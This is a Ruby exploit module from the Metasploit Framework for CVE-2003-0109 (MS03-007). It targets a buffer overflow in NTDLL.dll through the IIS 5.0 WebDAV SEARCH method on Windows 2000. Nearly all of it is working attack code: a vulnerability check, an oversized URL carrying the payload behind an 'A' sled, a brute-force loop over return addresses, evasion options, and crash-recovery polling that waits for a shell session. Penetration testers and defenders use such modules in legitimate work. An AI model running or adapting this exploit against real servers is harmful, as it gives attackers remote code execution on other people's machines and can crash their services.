##
# $Id: ms03_007_ntdll_webdav.rb 9929 2010-07-25 21:37:54Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft IIS 5.0 WebDAV ntdll.dll Path Overflow',
			'Description'    => %q{
				This exploits a buffer overflow in NTDLL.dll on Windows 2000
				through the SEARCH WebDAV method in IIS. This particular
				module only works against Windows 2000. It should have a
				reasonable chance of success against any service pack.
			},
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9929 $',
			'References'     =>
				[
					[ 'CVE', '2003-0109'],
					[ 'OSVDB', '4467'],
					[ 'BID', '7116'],
					[ 'MSB', 'MS03-007']
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 512,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic Brute Force', { } ],
				],
			'DisclosureDate' => 'May 30 2003',
			'DefaultTarget' => 0))

		register_evasion_options(
			[
				OptBool.new('invalid_search_request', [false, 'Replace the valid XML search with random data', 'false']),

				# XXX - ugh, there has to be a better way to remove entries from an
				# enum that overwriting the evalable enum option
				OptEnum.new('HTTP::uri_encode', [false, 'Enable URI encoding', 'none', ['none','hex-normal'], 'none'])
			], self.class
		)

		deregister_options('HTTP::junk_params', 'HTTP::header_folding')
	end

	def autofilter
		# Common vulnerability scanning tools report port 445/139
		# due to how they test for the vulnerability. Remap this
		# back to 80 for automated exploitation

		rport = datastore['RPORT'].to_i
		if ( rport == 139 or rport == 445 )
			rport = 80
		end

		true
	end

	def check
		url = 'x' * 65535
		xml =
			"<?xml version=\"1.0\"?>\r\n<g:searchrequest xmlns:g=\"DAV:\">\r\n" +
			"<g:sql>\r\nSelect \"DAV:displayname\" from scope()\r\n</g:sql>\r\n</g:searchrequest>\r\n"

		response = send_request_cgi({
			'uri'     => '/' + url,
			'ctype'   => 'text/xml',
			'method'  => 'SEARCH',
			'data'    => xml
		}, 5)


		if (response and response.body =~ /Server Error\(exception/)
			return Exploit::CheckCode::Vulnerable
		end

		# Did the server stop acceping requests?
		begin
			send_request_raw({'uri' => '/'}, 5)
		rescue
			return Exploit::CheckCode::Vulnerable
		end

		return Exploit::CheckCode::Safe
	end

	def exploit
		# verify the service is running up front
		send_request_raw({'uri' => '/'}, 5)

		# The targets in the most likely order they will work
		targets =
		[
			# Almost Targetted :)
			"\x4f\x4e", # =SP3
			"\x41\x42", # ~SP0  ~SP2
			"\x41\x43", # ~SP1, ~SP2

			# Generic Bruteforce
			"\x41\xc1",
			"\x41\xc3",
			"\x41\xc9",
			"\x41\xca",
			"\x41\xcb",
			"\x41\xcc",
			"\x41\xcd",
			"\x41\xce",
			"\x41\xcf",
			"\x41\xd0",
		]

		xml =
			"<?xml version=\"1.0\"?>\r\n<g:searchrequest xmlns:g=\"DAV:\">\r\n" +
			"<g:sql>\r\nSelect \"DAV:displayname\" from scope()\r\n</g:sql>\r\n</g:searchrequest>\r\n"

		if datastore['invalid_search_request'] == true
			xml = rand_text(rand(1024) + 32)
		end

		# The nop generator can be cpu-intensive for large buffers, so we use a static sled of 'A'
		# This decodes to "inc ecx"

		url = 'A' * 65516
		url[ url.length - payload.encoded.length, payload.encoded.length ] = payload.encoded

		targets.each { |ret|

			print_status("Trying return address 0x%.8x..." % Rex::Text.to_unicode(ret).unpack('V')[0])
			url[ 283, 2 ] = ret

			begin
				send_request_cgi({
					'uri'     => '/' + url,
					'ctype'   => 'text/xml',
					'method'  => 'SEARCH',
					'data'    => xml
				}, 5)
				handler
			rescue => e
				print_error("Attempt failed: #{e}")
			end

			1.upto(8) { |i|
				select(nil,nil,nil,0.25)
				return if self.session_created?
			}

			if !service_running?
				print_error('Giving up, IIS must have completely crashed')
				return
			end
		}
	end

	# Try connecting to the server up to 20 times, with a two second gap
	# This gives the server time to recover after a failed exploit attempt
	def service_running?
		print_status('Checking if IIS is back up after a failed attempt...')
		1.upto(20) {|i|
			begin
				send_request_raw({'uri' => '/'}, 5)
			rescue
				print_error("Connection failed (#{i} of 20)...")
				select(nil,nil,nil,2)
				next
			end
			return true
		}
		return false
	end

end